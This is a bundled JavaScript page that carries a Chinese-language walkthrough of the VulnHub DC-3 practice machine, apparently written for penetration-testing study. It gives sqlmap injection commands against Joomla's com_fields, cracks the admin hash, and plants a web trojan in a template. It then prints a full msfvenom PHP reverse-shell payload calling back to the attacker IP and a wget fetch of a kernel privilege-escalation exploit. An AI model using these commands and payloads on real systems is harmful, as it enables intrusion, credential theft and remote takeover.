"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[3495],{6744:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>a,default:()=>p,frontMatter:()=>c,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-3","title":"DC-3","description":"DC-3\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b","source":"@site/docs/VulnHub/Virtual Machines/DC-3.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-3","permalink":"/docs/VulnHub/Virtual Machines/DC-3","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-3.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-2","permalink":"/docs/VulnHub/Virtual Machines/DC-2"},"next":{"title":"DC-4","permalink":"/docs/VulnHub/Virtual Machines/DC-4"}}');var i=n(4848),r=n(8453);const c={},a=void 0,d={},t=[{value:"DC-3\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",id:"dc-3\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",level:2},{value:"\u4e3b\u673a\u53d1\u73b0",id:"\u4e3b\u673a\u53d1\u73b0",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:3},{value:"joomscan\u626b\u63cf",id:"joomscan\u626b\u63cf",level:4},{value:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",level:3},{value:"\u767b\u5f55web\u540e\u53f0",id:"\u767b\u5f55web\u540e\u53f0",level:3},{value:"\u53cd\u5f39shell",id:"\u53cd\u5f39shell",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}];function o(e){const s={blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.h2,{id:"dc-3\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",children:"DC-3\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b"}),"\n",(0,i.jsx)(s.h3,{id:"\u4e3b\u673a\u53d1\u73b0",children:"\u4e3b\u673a\u53d1\u73b0"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"arp-scan -l\n"})}),"\n",(0,i.jsxs)(s.p,{children:["\u9776\u673aip",(0,i.jsx)(s.code,{children:"192.168.56.113"})]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140034898.png",alt:"image-20240416140034898"})}),"\n",(0,i.jsx)(s.p,{children:"\u5c31\u5f00\u542f\u4e86\u4e00\u4e2a80\u7aef\u53e3\uff0c\u76f4\u63a5\u53bb\u770bweb\u9875\u9762"}),"\n",(0,i.jsx)(s.h3,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsxs)(s.p,{children:["\u7528",(0,i.jsx)(s.code,{children:"cmseek"}),"\u626b\u63cf\u5230cms\u7684\u540d\u5b57\u548c\u7248\u672c"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140246803.png",alt:"image-20240416140246803"})}),"\n",(0,i.jsx)(s.h4,{id:"joomscan\u626b\u63cf",children:"joomscan\u626b\u63cf"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"joomscan -u http://192.168.56.113\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416195152267.png",alt:"image-20240416195152267"})}),"\n",(0,i.jsx)(s.h3,{id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",children:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416140405440.png",alt:"image-20240416140405440"})}),"\n",(0,i.jsx)(s.p,{children:"\u627e\u5230\u8be5cms\u7684\u5386\u53f2\u6f0f\u6d1e"}),"\n",(0,i.jsx)(s.p,{children:"\u5b83\u7684\u5229\u7528\u65b9\u6cd5\u662f"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:'Using Sqlmap:\r\n\r\nsqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n'})}),"\n",(0,i.jsx)(s.p,{children:"\u76f4\u63a5sqlmap\u626b\u5c31\u884c\u4e86"}),"\n",(0,i.jsx)(s.p,{children:"\u7206\u6570\u636e\u5e93"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:'sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n'})}),"\n",(0,i.jsx)(s.p,{children:"\u7206\u8868\u540d"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:'sqlmap -u "http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]\n'})}),"\n",(0,i.jsx)(s.p,{children:"\u7206\u5b57\u6bb5"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sqlmap -u \"http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u67e5\u770b\u5b57\u6bb5\u5185\u5bb9"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sqlmap -u \"http://192.168.56.113/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump -p list[fullordering]\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5f97\u5230\u7528\u6237\u540d\u548c\u5bc6\u7801"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"+--------+--------------------------------------------------------------+\r\n| name   | password                                                     |\r\n+--------+--------------------------------------------------------------+\r\n| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |\r\n+--------+--------------------------------------------------------------+\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5bc6\u7801\u662fhash\uff0c\u53ef\u4ee5\u7528john\u7206\u7834\u8bd5\u8bd5"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"john pass1 --wordlist=/usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,i.jsxs)(s.p,{children:["\u5f97\u5230\u5bc6\u7801",(0,i.jsx)(s.code,{children:"snoopy"})]}),"\n",(0,i.jsx)(s.h3,{id:"\u767b\u5f55web\u540e\u53f0",children:"\u767b\u5f55web\u540e\u53f0"}),"\n",(0,i.jsx)(s.p,{children:"\u9996\u5148\u5c31\u662f\u5c1d\u8bd5\u5f80\u6587\u7ae0\u91cc\u5199php\u4ee3\u7801\uff0c\u7ed3\u679c\u53d1\u73b0\u662f\u4e0d\u80fd\u6267\u884c\u7684"}),"\n",(0,i.jsx)(s.p,{children:"\u6700\u7ec8\u5728\u6a21\u677f\u8fd9\u91cc\u53d1\u73b0\u53ef\u4ee5\u6dfb\u52a0\u6587\u4ef6"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141539882.png",alt:"image-20240416141539882"})}),"\n",(0,i.jsxs)(s.p,{children:["\u6211\u76f4\u63a5\u5728",(0,i.jsx)(s.code,{children:"index.php"}),"\u91cc\u76f4\u63a5\u5199\u4e00\u53e5\u8bdd\u6728\u9a6c"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141702059.png",alt:"image-20240416141702059"})}),"\n",(0,i.jsxs)(s.p,{children:["\u7528\u8681\u5251\u8fdb\u884c\u8fde\u63a5\uff0c\u53d1\u73b0\u8fd9\u91cc\u6211\u5199\u7684\u6728\u9a6c\uff0c\u5728",(0,i.jsx)(s.code,{children:"/var/www/html/templates/beez3/index.php"})]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416141929582.png",alt:"image-20240416141929582"})}),"\n",(0,i.jsxs)(s.p,{children:["\u672c\u6765\u60f3\u76f4\u63a5\u7528nc\u53cd\u5f39shell\uff0c\u53d1\u73b0\u8fd9\u4e2a",(0,i.jsx)(s.code,{children:"nc"}),"\u6ca1\u6709-e\u9009\u9879"]}),"\n",(0,i.jsx)(s.h3,{id:"\u53cd\u5f39shell",children:"\u53cd\u5f39shell"}),"\n",(0,i.jsxs)(s.p,{children:["\u90a3\u5c31\u7528",(0,i.jsx)(s.code,{children:"msf"}),"\u5f39shell\u5427"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your-IP-Address> LPORT=<Your-Port> -f raw > shell.php\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5229\u7528\u8fd9\u6761\u547d\u4ee4\u751f\u6210\u4e00\u4e2aphp\u7684\u7a33\u5b9ashell"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-php",children:"/*<?php /**/ error_reporting(0); $ip = '192.168.56.101'; $port = 1234; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5199\u51651.php"}),"\n",(0,i.jsx)(s.p,{children:"\u7528msf\u8fdb\u884c\u76d1\u542c"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"use exploit/multi/handler\r\nset payload php/meterpreter/reverse_tcp\r\nset LHOST 192.168.56.101\r\nset LPORT 1234\r\nrun\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416144534503.png",alt:"image-20240416144534503"})}),"\n",(0,i.jsx)(s.p,{children:"\u8f93\u5165shell\u5373\u53ef\u5f97\u5230\u4e00\u4e2ashell"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5f97\u5230\u4e00\u4e2a\u4f2a\u7ec8\u7aef"}),"\n",(0,i.jsx)(s.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(s.p,{children:"\u5229\u7528\u8f85\u52a9\u811a\u672c\u53d1\u73b0\u63d0\u6743\u6f0f\u6d1e"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/mzet-/linux-exploit-suggester\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416145927351.png",alt:"image-20240416145927351"})}),"\n",(0,i.jsx)(s.p,{children:"\u67e5\u770b\u5185\u6838\u7248\u672c\u548c\u7cfb\u7edf\u7248\u672c"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"uname -a\r\nlsb_release -a\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.code,{children:"Ubuntu 16.04 4.4.0"})}),"\n",(0,i.jsx)(s.p,{children:"\u627e\u5230\u8fd9\u4e2a\u63d0\u6743\u6f0f\u6d1e"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416200938317.png",alt:"image-20240416200938317"})}),"\n",(0,i.jsx)(s.p,{children:"\u6309\u7167\u6587\u6863\u6b65\u9aa4\u5373\u53ef"}),"\n",(0,i.jsx)(s.p,{children:"\u62f7\u8d1d\u5230tmp\u76ee\u5f55\u4e0b"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"wget http://192.168.56.101/exploit.tar\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u89e3\u538b"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"tar xf exploit.tar\n"})}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"./compile.sh \u7f16\u8bd1\r\n./doubleput\n"})}),"\n",(0,i.jsx)(s.p,{children:"\u5373\u53ef\u63d0\u6743\u6210\u529f"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240416201208816.png",alt:"image-20240416201208816"})}),"\n",(0,i.jsx)(s.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,i.jsxs)(s.blockquote,{children:["\n",(0,i.jsxs)(s.p,{children:["1.joomla\u8fd9\u4e2acms\u7684\u6f0f\u6d1e\u6bd4\u8f83\u591a\uff0c\u53ef\u4ee5\u7528\u4e13\u95e8\u7684\u5de5\u5177",(0,i.jsx)(s.code,{children:"joomscan"}),"\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,i.jsx)(s.p,{children:"2.msf\u7684\u53cd\u5f39shell\u662f\u6bd4\u8f83\u7a33\u5b9a\u7684shell\uff0c\u4e0d\u80fd\u7528nc\u6216bash\uff0c\u53ef\u4ee5\u7528msf"}),"\n",(0,i.jsx)(s.p,{children:"3.\u56e0\u4e3a\u8fd9\u662f\u8001\u9776\u673a\uff0c\u6240\u4ee5\u7cfb\u7edf\u5185\u6838\u4f1a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u627e\u522b\u4eba\u7684exp\u6253\u5c31\u884c\u4e86"}),"\n"]})]})}function p(e={}){const{wrapper:s}={...(0,r.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>a});var l=n(6540);const i={},r=l.createContext(i);function c(e){const s=l.useContext(r);return l.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),l.createElement(r.Provider,{value:s},e.children)}}}]);